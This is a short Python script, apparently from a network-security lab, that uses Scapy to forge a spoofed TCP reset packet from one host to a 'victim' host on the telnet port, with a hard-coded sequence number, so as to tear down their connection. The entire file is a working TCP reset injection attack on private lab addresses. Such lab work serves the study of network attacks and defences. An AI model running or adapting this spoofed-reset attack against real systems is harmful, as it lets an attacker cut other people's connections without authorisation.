#!/usr/bin/env python3
from scapy.all import *

ip = IP(src = "10.9.0.6", dst = "10.9.0.5") # pseudo user1 to victim destination ip addresses
tcp = TCP(sport = 58864, dport = 23, flags = "R", seq = 1861071804) # user1 and victim port numbers, next sequence number in transmission
pkt = ip/tcp
ls(pkt)
send(pkt, iface = "br-df6653c63eb9", verbose = 0)